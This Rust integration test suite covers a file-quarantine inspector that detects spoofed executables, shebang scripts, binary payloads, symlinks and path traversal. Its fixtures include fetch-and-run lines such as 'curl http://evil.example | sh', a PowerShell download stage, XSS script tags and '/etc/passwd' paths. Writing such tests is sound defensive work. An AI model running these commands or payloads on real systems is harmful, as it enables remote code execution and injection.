//! End-to-end integration tests for Milestone 1 (`feat/m1-streaming-inspector`).

use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use chrono::Utc;
use sha2::{Digest, Sha256};
use tempfile::tempdir;
use tokio::sync::RwLock;

use sentinel_guard::application::inspect_file::InspectFileUseCase;
use sentinel_guard::domain::entities::{RuntimeConfig, SecurityVerdict};
use sentinel_guard::domain::errors::DomainError;
use sentinel_guard::domain::path_policy::reject_forbidden_system_dir;
use sentinel_guard::domain::ports::{
    FileScanner, HashCalculator, MimeValidator, QuarantineMover, QuarantineRepo,
};
use sentinel_guard::infrastructure::magic_bytes::{
    MagicBytesInspector, STREAM_CHUNK_SIZE, StreamingHasher,
};
use sentinel_guard::infrastructure::sqlite_repo::SqliteStore;

/// Test-only real-filesystem implementation of [`QuarantineMover`] until `fs_watcher` lands.
struct TempFilesystemMover {
    observed_pre_inspection_modes: Mutex<Vec<u32>>,
}

impl TempFilesystemMover {
    fn new() -> Self {
        Self {
            observed_pre_inspection_modes: Mutex::new(Vec::new()),
        }
    }
}

#[async_trait]
impl QuarantineMover for TempFilesystemMover {
    async fn harden_permissions(&self, path: &Path, isolated: bool) -> Result<(), DomainError> {
        let link_meta = tokio::fs::symlink_metadata(path).await?;
        if link_meta.file_type().is_symlink() {
            return Err(DomainError::PathTraversalAttempt(format!(
                "Symlink rejected during permission hardening: {}",
                path.display()
            )));
        }
        let canonical_path = tokio::fs::canonicalize(path).await?;
        reject_forbidden_system_dir(&canonical_path)?;

        let mode = if isolated { 0o600 } else { 0o640 };
        tokio::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).await?;
        if !isolated {
            self.observed_pre_inspection_modes
                .lock()
                .expect("modes lock")
                .push(mode);
        }
        Ok(())
    }

    async fn move_to_approved(
        &self,
        source: &Path,
        approved_dir: &Path,
    ) -> Result<PathBuf, DomainError> {
        tokio::fs::create_dir_all(approved_dir).await?;
        let file_name = source
            .file_name()
            .ok_or_else(|| DomainError::InvalidPath("Missing file name".to_string()))?;
        let dest = approved_dir.join(file_name);
        tokio::fs::rename(source, &dest).await?;
        tokio::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o640)).await?;
        Ok(dest)
    }

    async fn isolate_rejected(
        &self,
        source: &Path,
        quarantine_dir: &Path,
    ) -> Result<PathBuf, DomainError> {
        let isolated_dir = quarantine_dir.join("isolated");
        tokio::fs::create_dir_all(&isolated_dir).await?;
        let file_name = source
            .file_name()
            .ok_or_else(|| DomainError::InvalidPath("Missing file name".to_string()))?;
        let dest = isolated_dir.join(file_name);
        tokio::fs::rename(source, &dest).await?;
        tokio::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o600)).await?;
        Ok(dest)
    }
}

async fn build_pipeline(
    quarantine_dir: PathBuf,
    approved_dir: PathBuf,
) -> (
    InspectFileUseCase,
    Arc<TempFilesystemMover>,
    Arc<SqliteStore>,
) {
    let store = Arc::new(
        SqliteStore::connect_and_migrate("sqlite::memory:")
            .await
            .expect("sqlite in-memory migration"),
    );
    let runtime_config = Arc::new(RwLock::new(RuntimeConfig {
        quarantine_dir,
        approved_dir,
        clamd_socket_path: PathBuf::from("/var/run/clamav/clamd.ctl"),
        suricata_eve_path: PathBuf::from("/var/log/suricata/eve.json"),
        updated_at: Utc::now(),
    }));

    let hasher = Arc::new(StreamingHasher::new());
    let inspector = Arc::new(MagicBytesInspector::new());
    let scanners: Vec<Arc<dyn FileScanner>> = vec![inspector.clone()];
    let mover = Arc::new(TempFilesystemMover::new());

    let use_case = InspectFileUseCase::new(
        hasher,
        inspector,
        scanners,
        mover.clone(),
        store.clone(),
        runtime_config,
    );

    (use_case, mover, store)
}

fn build_pdf_payload(header: &[u8], total_len: usize) -> Vec<u8> {
    let mut payload = header.to_vec();
    let remaining = total_len.saturating_sub(payload.len());
    payload.extend((0..remaining).map(|i| ((i.wrapping_mul(37) ^ (i >> 8)) % 251) as u8));
    payload
}

#[tokio::test]
async fn pipeline_approves_large_valid_pdfs_and_persists_streaming_digests() {
    let root = tempdir().expect("tempdir");
    let quarantine_dir = root.path().join("quarantine");
    let approved_dir = root.path().join("approved");
    std::fs::create_dir_all(&quarantine_dir).expect("create quarantine");
    std::fs::create_dir_all(&approved_dir).expect("create approved");

    let (use_case, mover, store) =
        build_pipeline(quarantine_dir.clone(), approved_dir.clone()).await;

    // 1. Valid PDF 1.5 > 64 KB and non-exact-multiple of 64 KB (~200 KB)
    let approx_200kb_len = 200 * 1024 + 333;
    let pdf_15_source = quarantine_dir.join("contrato_v15.pdf");
    let pdf_15_bytes = build_pdf_payload(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n", approx_200kb_len);
    std::fs::write(&pdf_15_source, &pdf_15_bytes).expect("write pdf 1.5");
    std::fs::set_permissions(&pdf_15_source, std::fs::Permissions::from_mode(0o755))
        .expect("chmod 0755");

    let expected_hash_15 = hex::encode(Sha256::digest(&pdf_15_bytes));
    let report_15 = use_case
        .execute(&pdf_15_source)
        .await
        .expect("valid PDF 1.5 (~200 KB) should complete inspection");

    assert!(report_15.id.is_some());
    assert_eq!(report_15.verdict, SecurityVerdict::Clean);
    assert_eq!(report_15.artifact.sanitized_name, "contrato_v15.pdf");
    assert_eq!(report_15.artifact.extension.as_deref(), Some("pdf"));
    assert_eq!(report_15.artifact.size_bytes, approx_200kb_len as u64);
    assert_eq!(report_15.artifact.sha256_hash, expected_hash_15);
    assert_eq!(
        report_15.artifact.detected_mime.as_deref(),
        Some("application/pdf")
    );
    let expected_dest_15 = approved_dir.join("contrato_v15.pdf");
    assert_eq!(report_15.destination_path.as_ref(), Some(&expected_dest_15));
    assert!(!pdf_15_source.exists());
    assert!(expected_dest_15.exists());
    assert_eq!(
        std::fs::metadata(&expected_dest_15)
            .expect("dest 1.5 metadata")
            .permissions()
            .mode()
            & 0o777,
        0o640
    );

    // 2. Valid PDF 1.7 exact 256 KB (4 * 64 KB chunks) with executable bit initially set
    let exact_256kb_len = STREAM_CHUNK_SIZE * 4;
    let pdf_17_source = quarantine_dir.join("Manual.PDF");
    let pdf_17_bytes = build_pdf_payload(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n", exact_256kb_len);
    std::fs::write(&pdf_17_source, &pdf_17_bytes).expect("write pdf 1.7");
    std::fs::set_permissions(&pdf_17_source, std::fs::Permissions::from_mode(0o755))
        .expect("chmod 0755");

    let expected_hash_17 = hex::encode(Sha256::digest(&pdf_17_bytes));
    let report_17 = use_case
        .execute(&pdf_17_source)
        .await
        .expect("valid PDF 1.7 (256 KB) should complete inspection");

    assert!(report_17.id.is_some());
    assert_eq!(report_17.verdict, SecurityVerdict::Clean);
    assert_eq!(report_17.artifact.sanitized_name, "Manual.PDF");
    assert_eq!(report_17.artifact.extension.as_deref(), Some("pdf"));
    assert_eq!(report_17.artifact.size_bytes, exact_256kb_len as u64);
    assert_eq!(report_17.artifact.sha256_hash, expected_hash_17);
    assert_eq!(
        report_17.artifact.detected_mime.as_deref(),
        Some("application/pdf")
    );

    let expected_dest_17 = approved_dir.join("Manual.PDF");
    assert_eq!(report_17.destination_path.as_ref(), Some(&expected_dest_17));
    assert!(!pdf_17_source.exists());
    assert!(expected_dest_17.exists());
    assert_eq!(
        std::fs::metadata(&expected_dest_17)
            .expect("dest 1.7 metadata")
            .permissions()
            .mode()
            & 0o777,
        0o640
    );
    assert_eq!(
        *mover.observed_pre_inspection_modes.lock().expect("lock"),
        vec![0o640, 0o640]
    );

    let recent = store.list_recent_reports(10).await.expect("list reports");
    assert_eq!(recent.len(), 2);
    assert_eq!(recent[0], report_17);
    assert_eq!(recent[1], report_15);
}

#[tokio::test]
async fn pipeline_isolates_spoofed_elf_pe_shebang_empty_and_corrupted_files() {
    let root = tempdir().expect("tempdir");
    let quarantine_dir = root.path().join("quarantine");
    let approved_dir = root.path().join("approved");
    std::fs::create_dir_all(&quarantine_dir).expect("create quarantine");
    std::fs::create_dir_all(&approved_dir).expect("create approved");

    let (use_case, _, store) = build_pipeline(quarantine_dir.clone(), approved_dir.clone()).await;

    // 1. Spoofed ELF [0x7F, 0x45, 0x4C, 0x46, ...] disguised as .pdf
    let spoofed_elf_pdf = quarantine_dir.join("invoice.pdf");
    let mut elf_pdf_payload = vec![0u8; 64];
    elf_pdf_payload[..8].copy_from_slice(&[0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
    elf_pdf_payload[16] = 0x02; // ET_EXEC
    std::fs::write(&spoofed_elf_pdf, &elf_pdf_payload).expect("write spoofed elf pdf");
    std::fs::set_permissions(&spoofed_elf_pdf, std::fs::Permissions::from_mode(0o755))
        .expect("chmod 0755");

    let elf_pdf_report = use_case
        .execute(&spoofed_elf_pdf)
        .await
        .expect("spoofed elf pdf should be isolated");
    assert_eq!(
        elf_pdf_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "pdf".to_string(),
            actual_mime: "application/x-executable".to_string(),
        }
    );
    let elf_pdf_dest = quarantine_dir.join("isolated/invoice.pdf");
    assert_eq!(
        elf_pdf_report.destination_path.as_ref(),
        Some(&elf_pdf_dest)
    );
    assert!(elf_pdf_dest.exists());
    assert_eq!(
        std::fs::metadata(&elf_pdf_dest)
            .expect("elf pdf dest metadata")
            .permissions()
            .mode()
            & 0o777,
        0o600
    );

    // 2. Spoofed ELF disguised as .jpg with 0o777 permissions initially
    let spoofed_jpg = quarantine_dir.join("holiday.jpg");
    let mut elf_jpg_payload = vec![0u8; 64];
    elf_jpg_payload[..4].copy_from_slice(b"\x7fELF");
    std::fs::write(&spoofed_jpg, &elf_jpg_payload).expect("write spoofed elf jpg");
    std::fs::set_permissions(&spoofed_jpg, std::fs::Permissions::from_mode(0o777))
        .expect("chmod 0777");

    let elf_jpg_report = use_case
        .execute(&spoofed_jpg)
        .await
        .expect("spoofed elf jpg should be isolated");
    assert_eq!(
        elf_jpg_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "jpg".to_string(),
            actual_mime: "application/x-executable".to_string(),
        }
    );
    let elf_jpg_dest = quarantine_dir.join("isolated/holiday.jpg");
    assert_eq!(
        elf_jpg_report.destination_path.as_ref(),
        Some(&elf_jpg_dest)
    );
    assert!(elf_jpg_dest.exists());
    assert_eq!(
        std::fs::metadata(&elf_jpg_dest)
            .expect("elf jpg dest metadata")
            .permissions()
            .mode()
            & 0o777,
        0o600
    );

    // 3. Spoofed PE/EXE [0x4D, 0x5A, ...] disguised as .jpg
    let spoofed_pe_jpg = quarantine_dir.join("avatar.jpg");
    let mut pe_payload = vec![0u8; 128];
    pe_payload[..4].copy_from_slice(&[0x4D, 0x5A, 0x90, 0x00]);
    std::fs::write(&spoofed_pe_jpg, &pe_payload).expect("write spoofed pe jpg");
    std::fs::set_permissions(&spoofed_pe_jpg, std::fs::Permissions::from_mode(0o755))
        .expect("chmod 0755");

    let pe_report = use_case
        .execute(&spoofed_pe_jpg)
        .await
        .expect("spoofed PE should be isolated");
    assert_eq!(
        pe_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "jpg".to_string(),
            actual_mime: "application/vnd.microsoft.portable-executable".to_string(),
        }
    );
    let pe_dest = quarantine_dir.join("isolated/avatar.jpg");
    assert_eq!(pe_report.destination_path.as_ref(), Some(&pe_dest));
    assert!(pe_dest.exists());
    assert_eq!(
        std::fs::metadata(&pe_dest)
            .expect("pe dest metadata")
            .permissions()
            .mode()
            & 0o777,
        0o600
    );

    // 4. Shebang script disguised as .txt
    let spoofed_txt = quarantine_dir.join("notes.txt");
    std::fs::write(&spoofed_txt, b"#!/bin/sh\ncurl http://evil.example | sh\n")
        .expect("write spoofed txt script");
    let script_txt_report = use_case
        .execute(&spoofed_txt)
        .await
        .expect("spoofed shebang txt should be isolated");
    assert_eq!(
        script_txt_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "txt".to_string(),
            actual_mime: "text/x-shellscript".to_string(),
        }
    );

    // 5. Shebang script disguised as .pdf
    let spoofed_pdf_script = quarantine_dir.join("manual_exec.pdf");
    std::fs::write(&spoofed_pdf_script, b"#!/bin/sh\nid\n").expect("write spoofed pdf script");
    let script_pdf_report = use_case
        .execute(&spoofed_pdf_script)
        .await
        .expect("spoofed shebang pdf should be isolated");
    assert_eq!(
        script_pdf_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "pdf".to_string(),
            actual_mime: "text/x-shellscript".to_string(),
        }
    );

    // 6. Binary/NUL payload lacking PDF magic disguised as .pdf -> MaliciousSpoofing (octet-stream)
    let broken_pdf = quarantine_dir.join("corrupted.pdf");
    std::fs::write(
        &broken_pdf,
        b"\x9f\x12\xab\x44corrupted-pdf-bytes-without-magic-header\x00\xff\x13\x37",
    )
    .expect("write broken pdf");
    let broken_pdf_report = use_case
        .execute(&broken_pdf)
        .await
        .expect("binary payload disguised as pdf should be isolated");
    assert_eq!(
        broken_pdf_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "pdf".to_string(),
            actual_mime: "application/octet-stream".to_string(),
        }
    );

    // 7. Corrupted non-empty PNG (missing magic bytes)
    let broken_png = quarantine_dir.join("broken.png");
    std::fs::write(&broken_png, b"not a real png image at all").expect("write broken png");
    let broken_png_report = use_case
        .execute(&broken_png)
        .await
        .expect("corrupted png should be isolated");
    assert_eq!(
        broken_png_report.verdict,
        SecurityVerdict::CorruptedOrUnreadable {
            reason: "missing or invalid magic bytes for .png".to_string(),
        }
    );

    // 8. Empty 0-byte PDF
    let empty_pdf = quarantine_dir.join("empty.pdf");
    std::fs::write(&empty_pdf, b"").expect("write empty pdf");
    let empty_pdf_report = use_case
        .execute(&empty_pdf)
        .await
        .expect("empty pdf should be isolated");
    assert_eq!(
        empty_pdf_report.verdict,
        SecurityVerdict::CorruptedOrUnreadable {
            reason: "empty file (0 bytes)".to_string(),
        }
    );

    // 9. Empty 0-byte TXT
    let empty_txt = quarantine_dir.join("empty.txt");
    std::fs::write(&empty_txt, b"").expect("write empty txt");
    let empty_txt_report = use_case
        .execute(&empty_txt)
        .await
        .expect("empty txt should be isolated");
    assert_eq!(
        empty_txt_report.verdict,
        SecurityVerdict::CorruptedOrUnreadable {
            reason: "empty file (0 bytes)".to_string(),
        }
    );

    // 10. Blocked executable/script extension even without shebang or magic bytes -> MaliciousSpoofing
    let raw_script = quarantine_dir.join("dropper.sh");
    std::fs::write(&raw_script, b"echo pwned\n").expect("write raw script");
    let raw_script_report = use_case
        .execute(&raw_script)
        .await
        .expect("blocked .sh extension must be isolated");
    assert_eq!(
        raw_script_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "sh".to_string(),
            actual_mime: "application/x-executable-extension".to_string(),
        }
    );

    // 11. UTF-8 BOM + shebang disguised as .txt -> MaliciousSpoofing
    let bom_txt = quarantine_dir.join("bom_script.txt");
    std::fs::write(&bom_txt, b"\xEF\xBB\xBF#!/bin/sh\nid\n").expect("write bom script");
    let bom_report = use_case
        .execute(&bom_txt)
        .await
        .expect("BOM shebang txt must be isolated");
    assert_eq!(
        bom_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "txt".to_string(),
            actual_mime: "text/x-shellscript".to_string(),
        }
    );

    // 12. Shellcode / NUL bytes disguised as .txt -> MaliciousSpoofing (octet-stream)
    let shellcode_txt = quarantine_dir.join("shellcode.txt");
    std::fs::write(&shellcode_txt, b"header\x00\x90\x90\xff\xfe").expect("write shellcode txt");
    let shellcode_report = use_case
        .execute(&shellcode_txt)
        .await
        .expect("binary payload in txt must be isolated");
    assert_eq!(
        shellcode_report.verdict,
        SecurityVerdict::MaliciousSpoofing {
            expected_ext: "txt".to_string(),
            actual_mime: "application/octet-stream".to_string(),
        }
    );

    // Approved directory must remain empty; all 12 isolated reports must be persisted.
    assert_eq!(
        std::fs::read_dir(&approved_dir)
            .expect("read approved")
            .count(),
        0
    );
    let stored = store.list_recent_reports(20).await.expect("list reports");
    assert_eq!(stored.len(), 12);
}

#[tokio::test]
async fn pipeline_enforces_zero_trust_dangerous_formats_plaintext_guards_and_unknown_extensions() {
    let root = tempdir().expect("tempdir");
    let quarantine_dir = root.path().join("quarantine");
    let approved_dir = root.path().join("approved");
    std::fs::create_dir_all(&quarantine_dir).expect("create quarantine");
    std::fs::create_dir_all(&approved_dir).expect("create approved");

    let (use_case, _, store) = build_pipeline(quarantine_dir.clone(), approved_dir.clone()).await;

    let malicious_cases: Vec<(&str, Vec<u8>, &str, &str)> = vec![
        // 1. Scripts without #! and dangerous executable/active extensions
        (
            "evil.sh",
            b"curl evil | sh\n".to_vec(),
            "sh",
            "application/x-executable-extension",
        ),
        (
            "payload.ps1",
            b"Write-Output 'stage1'; Invoke-WebRequest http://evil.example/a -OutFile a\n".to_vec(),
            "ps1",
            "application/x-executable-extension",
        ),
        (
            "dropper.exe",
            b"stub dropper without MZ magic\n".to_vec(),
            "exe",
            "application/x-executable-extension",
        ),
        (
            "page.html",
            b"<!DOCTYPE html><html><script>alert(1)</script></html>\n".to_vec(),
            "html",
            "text/html",
        ),
        (
            "raw_text.html",
            b"plain text disguised with html extension\n".to_vec(),
            "html",
            "application/x-executable-extension",
        ),
        (
            "vector.svg",
            b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>\n".to_vec(),
            "svg",
            "application/x-executable-extension",
        ),
        (
            "mod.wasm",
            b"\x00asm\x01\x00\x00\x00".to_vec(),
            "wasm",
            "application/wasm",
        ),
        (
            "app.jar",
            b"PK\x03\x04\x14\x00\x00\x00\x08\x00".to_vec(),
            "jar",
            "application/zip",
        ),
        // 2. Binary / NUL / invalid UTF-8 payloads inside PlainText (.txt, .json)
        (
            "nul_payload.txt",
            b"plain prefix\x00hidden binary".to_vec(),
            "txt",
            "application/octet-stream",
        ),
        (
            "invalid_utf8.txt",
            b"prefix \xff\xfe\x80 suffix".to_vec(),
            "txt",
            "application/octet-stream",
        ),
        (
            "nul_payload.json",
            b"{\"key\":\"val\x00ue\"}".to_vec(),
            "json",
            "application/octet-stream",
        ),
        (
            "invalid_utf8.json",
            b"{\"key\":\"\xff\xfe\"}".to_vec(),
            "json",
            "application/octet-stream",
        ),
        // 3. UTF-8 BOM + shebang in .txt and extensionless file
        (
            "bom_with_ext.txt",
            b"\xEF\xBB\xBF#!/bin/sh\nid\n".to_vec(),
            "txt",
            "text/x-shellscript",
        ),
        (
            "bom_noext",
            b"\xEF\xBB\xBF#!/bin/sh\nid\n".to_vec(),
            "<none>",
            "text/x-shellscript",
        ),
        // 4. Absent or unknown (.custom) extension containing binary content
        (
            "noext_binary",
            b"\x00\x90\x90\xff\xfe".to_vec(),
            "<none>",
            "application/octet-stream",
        ),
        (
            "blob.custom",
            b"%PDF-1.5\n%binary inside custom ext\n".to_vec(),
            "custom",
            "application/pdf",
        ),
    ];

    for (file_name, payload, expected_ext, expected_mime) in &malicious_cases {
        let source = quarantine_dir.join(file_name);
        std::fs::write(&source, payload).expect("write malicious case");
        std::fs::set_permissions(&source, std::fs::Permissions::from_mode(0o755))
            .expect("chmod 0755");

        let report = use_case
            .execute(&source)
            .await
            .expect("malicious case should be isolated with report");

        assert_eq!(
            report.verdict,
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: (*expected_ext).to_string(),
                actual_mime: (*expected_mime).to_string(),
            },
            "unexpected verdict for {file_name}"
        );
        let isolated_dest = quarantine_dir.join("isolated").join(file_name);
        assert_eq!(report.destination_path.as_ref(), Some(&isolated_dest));
        assert!(
            !source.exists(),
            "{file_name} must be moved from quarantine"
        );
        assert!(isolated_dest.exists(), "{file_name} must exist in isolated");
        assert_eq!(
            std::fs::metadata(&isolated_dest)
                .expect("isolated metadata")
                .permissions()
                .mode()
                & 0o777,
            0o600
        );
    }

    assert_eq!(
        std::fs::read_dir(&approved_dir)
            .expect("read approved")
            .count(),
        0
    );
    let stored = store.list_recent_reports(30).await.expect("list reports");
    assert_eq!(stored.len(), malicious_cases.len());
}

#[cfg(unix)]
#[tokio::test]
async fn pipeline_rejects_symlinks_and_traversal_paths_without_side_effects() {
    let root = tempdir().expect("tempdir");
    let quarantine_dir = root.path().join("quarantine");
    let approved_dir = root.path().join("approved");
    let outside_dir = root.path().join("outside");
    std::fs::create_dir_all(&quarantine_dir).expect("create quarantine");
    std::fs::create_dir_all(&approved_dir).expect("create approved");
    std::fs::create_dir_all(&outside_dir).expect("create outside");

    let (use_case, _, store) = build_pipeline(quarantine_dir.clone(), approved_dir.clone()).await;

    let outside_secret = root.path().join("secret.txt");
    std::fs::write(&outside_secret, b"sensitive").expect("write outside secret");

    let outside_doc = outside_dir.join("doc.pdf");
    std::fs::write(&outside_doc, b"%PDF-1.5\n%outside\n").expect("write outside doc");
    std::fs::set_permissions(&outside_doc, std::fs::Permissions::from_mode(0o755))
        .expect("chmod 0755 outside doc");

    let symlink_target = quarantine_dir.join("link.txt");
    std::os::unix::fs::symlink(&outside_secret, &symlink_target).expect("create symlink");

    let dangling_symlink = quarantine_dir.join("dangling.pdf");
    std::os::unix::fs::symlink(root.path().join("missing.pdf"), &dangling_symlink)
        .expect("create dangling symlink");

    // Verify direct StreamingHasher and MagicBytesInspector symlink rejection as well as full pipeline
    let hasher = StreamingHasher::new();
    let inspector = MagicBytesInspector::new();

    for symlink in [&symlink_target, &dangling_symlink] {
        let hash_err = hasher
            .calculate_sha256(symlink)
            .await
            .expect_err("StreamingHasher must reject symlink");
        assert!(matches!(hash_err, DomainError::PathTraversalAttempt(_)));

        let mime_err = inspector
            .detect_mime(symlink)
            .await
            .expect_err("MagicBytesInspector must reject symlink");
        assert!(matches!(mime_err, DomainError::PathTraversalAttempt(_)));

        let pipeline_err = use_case
            .execute(symlink)
            .await
            .expect_err("pipeline must reject symlink");
        assert!(matches!(pipeline_err, DomainError::PathTraversalAttempt(_)));
    }

    let real_inside = quarantine_dir.join("real.txt");
    std::fs::write(&real_inside, b"legit").expect("write real_inside");
    let sub_traversal = quarantine_dir.join("sub/../real.txt");
    for traversal_path in [quarantine_dir.join("../secret.txt"), sub_traversal.clone()] {
        let hash_err = hasher
            .calculate_sha256(&traversal_path)
            .await
            .expect_err("StreamingHasher must reject '..' traversal");
        assert!(matches!(hash_err, DomainError::PathTraversalAttempt(_)));

        let mime_err = inspector
            .detect_mime(&traversal_path)
            .await
            .expect_err("MagicBytesInspector must reject '..' traversal");
        assert!(matches!(mime_err, DomainError::PathTraversalAttempt(_)));

        let pipeline_err = use_case
            .execute(&traversal_path)
            .await
            .expect_err("pipeline must reject traversal path");
        assert!(matches!(pipeline_err, DomainError::PathTraversalAttempt(_)));
    }

    // Files outside quarantine_dir must be rejected without touching or moving them
    for outside_path in [
        outside_secret.as_path(),
        outside_doc.as_path(),
        Path::new("/tmp/outside/doc.pdf"),
    ] {
        let outside_err = use_case
            .execute(outside_path)
            .await
            .expect_err("pipeline must reject file outside quarantine_dir");
        assert!(matches!(outside_err, DomainError::PathTraversalAttempt(_)));
    }
    assert!(outside_doc.exists());
    assert_eq!(
        std::fs::metadata(&outside_doc)
            .expect("outside_doc metadata")
            .permissions()
            .mode()
            & 0o777,
        0o755
    );

    // System directory path must be rejected with ForbiddenSystemDirectory
    let etc_err = use_case
        .execute(Path::new("/etc/passwd"))
        .await
        .expect_err("pipeline must reject /etc/passwd");
    assert!(matches!(etc_err, DomainError::ForbiddenSystemDirectory(_)));

    // Ancestor symlink inside quarantine pointing to /etc (quarantine/evil_dir -> /etc)
    let evil_dir = quarantine_dir.join("evil_dir");
    std::os::unix::fs::symlink("/etc", &evil_dir).expect("create ancestor symlink to /etc");
    let ancestor_passwd = evil_dir.join("passwd");
    if ancestor_passwd.exists() {
        let hasher_err = hasher
            .calculate_sha256(&ancestor_passwd)
            .await
            .expect_err("StreamingHasher must reject /etc ancestor symlink");
        assert!(matches!(
            hasher_err,
            DomainError::ForbiddenSystemDirectory(_)
        ));

        let mime_err = inspector
            .detect_mime(&ancestor_passwd)
            .await
            .expect_err("MagicBytesInspector must reject /etc ancestor symlink");
        assert!(matches!(mime_err, DomainError::ForbiddenSystemDirectory(_)));

        let ancestor_err = use_case
            .execute(&ancestor_passwd)
            .await
            .expect_err("pipeline must reject file via /etc ancestor symlink");
        assert!(matches!(
            ancestor_err,
            DomainError::ForbiddenSystemDirectory(_)
        ));
    }

    assert_eq!(
        std::fs::read_dir(&approved_dir)
            .expect("read approved")
            .count(),
        0
    );
    assert!(!quarantine_dir.join("isolated").exists());
    assert!(
        store
            .list_recent_reports(10)
            .await
            .expect("list reports")
            .is_empty()
    );
}

#[tokio::test]
async fn pipeline_approves_plain_text_readme_and_valid_unicode_multidot_filenames() {
    let root = tempdir().expect("tempdir");
    let quarantine_dir = root.path().join("quarantine");
    let approved_dir = root.path().join("approved");
    std::fs::create_dir_all(&quarantine_dir).expect("create quarantine");
    std::fs::create_dir_all(&approved_dir).expect("create approved");

    let (use_case, _, store) = build_pipeline(quarantine_dir.clone(), approved_dir.clone()).await;

    let txt_source = quarantine_dir.join("notes.txt");
    std::fs::write(&txt_source, b"Sentinel Guard plain-text document.\n").expect("write txt");

    let txt_report = use_case
        .execute(&txt_source)
        .await
        .expect("plain text document should succeed");

    assert_eq!(txt_report.verdict, SecurityVerdict::Clean);
    assert_eq!(txt_report.artifact.detected_mime, None);
    assert_eq!(
        txt_report.destination_path,
        Some(approved_dir.join("notes.txt"))
    );
    assert!(approved_dir.join("notes.txt").exists());
    assert!(!txt_source.exists());

    // Extensionless README with pure UTF-8 text must be approved as Clean
    let readme_source = quarantine_dir.join("README");
    std::fs::write(
        &readme_source,
        "Guia operacional Sentinel Guard: inspeção em UTF-8 puro.\n".as_bytes(),
    )
    .expect("write README");

    let readme_report = use_case
        .execute(&readme_source)
        .await
        .expect("pure UTF-8 README without extension should succeed");

    assert_eq!(readme_report.verdict, SecurityVerdict::Clean);
    assert_eq!(readme_report.artifact.sanitized_name, "README");
    assert_eq!(readme_report.artifact.extension, None);
    assert_eq!(readme_report.artifact.detected_mime, None);
    assert_eq!(
        readme_report.destination_path,
        Some(approved_dir.join("README"))
    );
    assert!(approved_dir.join("README").exists());
    assert!(!readme_source.exists());

    let json_source = quarantine_dir.join("config.json");
    std::fs::write(
        &json_source,
        "{\"status\":\"ok\",\"msg\":\"ação\"}\n".as_bytes(),
    )
    .expect("write config.json");

    let json_report = use_case
        .execute(&json_source)
        .await
        .expect("pure UTF-8 JSON should succeed");
    assert_eq!(json_report.verdict, SecurityVerdict::Clean);
    assert_eq!(json_report.artifact.extension.as_deref(), Some("json"));
    assert!(approved_dir.join("config.json").exists());

    let unicode_name = "aula.01.ação final.pdf";
    let unicode_source = quarantine_dir.join(unicode_name);
    let pdf_bytes = build_pdf_payload(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n", 1_024);
    std::fs::write(&unicode_source, &pdf_bytes).expect("write unicode pdf");

    let unicode_report = use_case
        .execute(&unicode_source)
        .await
        .expect("valid unicode multidot pdf should succeed");

    assert_eq!(unicode_report.verdict, SecurityVerdict::Clean);
    assert_eq!(unicode_report.artifact.sanitized_name, unicode_name);
    assert_eq!(unicode_report.artifact.extension.as_deref(), Some("pdf"));
    assert_eq!(
        unicode_report.artifact.detected_mime.as_deref(),
        Some("application/pdf")
    );
    assert_eq!(
        unicode_report.destination_path,
        Some(approved_dir.join(unicode_name))
    );
    assert!(approved_dir.join(unicode_name).exists());
    assert!(!unicode_source.exists());

    let stored = store.list_recent_reports(10).await.expect("list reports");
    assert_eq!(stored.len(), 4);
    assert_eq!(stored[0], unicode_report);
    assert_eq!(stored[1], json_report);
    assert_eq!(stored[2], readme_report);
    assert_eq!(stored[3], txt_report);
}
